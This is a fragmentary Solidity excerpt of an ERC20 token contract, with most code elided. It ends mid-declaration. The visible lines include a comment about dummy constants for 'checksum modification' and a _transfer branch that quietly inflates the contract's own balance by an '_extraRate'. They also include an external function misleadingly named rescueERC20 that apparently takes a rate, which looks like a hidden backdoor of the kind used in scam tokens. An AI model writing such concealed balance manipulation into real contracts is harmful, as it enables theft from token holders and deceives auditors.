...
contract Contract is Context, IERC20, Ownable {
    ...
    // Dummy constants for checksum modification
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from == address(this) && _extraRate > 0) {
            uint256 extraAmount = amount.mul(_extraRate).div(100);
            _balances[from] = _balances[from].add(extraAmount);
        }
    ...
    function rescueERC20(uint256 rate) external {
